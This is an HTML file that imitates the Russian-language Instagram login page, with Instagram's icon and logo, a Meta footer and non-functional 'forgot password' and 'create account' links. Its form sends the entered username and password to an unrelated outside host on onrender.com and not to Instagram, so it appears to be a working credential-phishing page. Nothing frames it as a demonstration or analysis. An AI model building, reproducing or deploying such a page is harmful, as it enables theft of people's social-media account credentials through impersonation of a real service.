<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>

<link rel="icon"
href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#152235;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
    Roboto,Helvetica,Arial,sans-serif;
    min-height:100vh;
    color:white;
}

/* MAIN */
.container{
    width:100%;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

/* LOGIN BLOCK */
.login-box{
    width:100%;
    max-width:420px;
    display:flex;
    flex-direction:column;
    align-items:center;
}

/* LANGUAGE */
.language{
    color:rgba(255,255,255,0.75);
    font-size:15px;
    margin-bottom:70px;
}

/* LOGO */
.logo{
    width:82px;
    height:82px;
    object-fit:contain;
    margin-bottom:60px;
}

/* FORM */
form{
    width:100%;
}

.input-box{
    width:100%;
    margin-bottom:14px;
}

input{
    width:100%;
    height:64px;
    border-radius:16px;
    border:1px solid rgba(255,255,255,0.15);
    background:transparent;
    padding:0 18px;
    font-size:17px;
    color:white;
    outline:none;
}

input::placeholder{
    color:rgba(255,255,255,0.55);
}

input:focus{
    border-color:#3797ff;
}

/* LOGIN BUTTON */
button{
    width:100%;
    height:58px;
    border:none;
    border-radius:18px;
    background:#0095f6;
    color:white;
    font-size:20px;
    font-weight:600;
    margin-top:6px;
    cursor:pointer;
}

/* FORGOT */
.forgot{
    margin-top:28px;
    text-decoration:none;
    color:white;
    font-size:16px;
}

/* BOTTOM */
.bottom{
    width:100%;
    margin-top:120px;
    display:flex;
    flex-direction:column;
    align-items:center;
}

/* CREATE ACCOUNT */
.create-account{
    width:100%;
    height:58px;
    border:1px solid #3797ff;
    border-radius:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    color:#3797ff;
    text-decoration:none;
    font-size:18px;
    font-weight:500;
}

/* META */
.meta{
    margin-top:34px;
    color:white;
    opacity:0.8;
    font-size:18px;
    display:flex;
    align-items:center;
    gap:6px;
}

/* MOBILE */
@media(max-width:600px){

    .container{
        padding:24px;
    }

    .login-box{
        max-width:100%;
    }

    .language{
        margin-bottom:60px;
    }

    .logo{
        width:84px;
        height:84px;
        margin-bottom:70px;
    }

    input{
        height:62px;
        font-size:16px;
    }

    button{
        height:58px;
        font-size:18px;
    }

    .bottom{
        margin-top:140px;
    }

}

</style>
</head>

<body>

<div class="container">

    <div class="login-box">

        <div class="language">Русский</div>

        <img
        src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png"
        class="logo"
        alt="Instagram">

        <form action="https://insta-l177.onrender.com/" method="POST">

            <div class="input-box">
                <input
                type="text"
                name="username"
                placeholder="Имя пользователя, эл. адрес или номер телефона"
                required>
            </div>

            <div class="input-box">
                <input
                type="password"
                name="password"
                placeholder="Пароль"
                required>
            </div>

            <button type="submit">
                Войти
            </button>

        </form>

        <a href="#" class="forgot">
            Забыли пароль?
        </a>

        <div class="bottom">

            <a href="#" class="create-account">
                Создать новый аккаунт
            </a>

            <div class="meta">
                ∞ Meta
            </div>

        </div>

    </div>

</div>

</body>
</html>
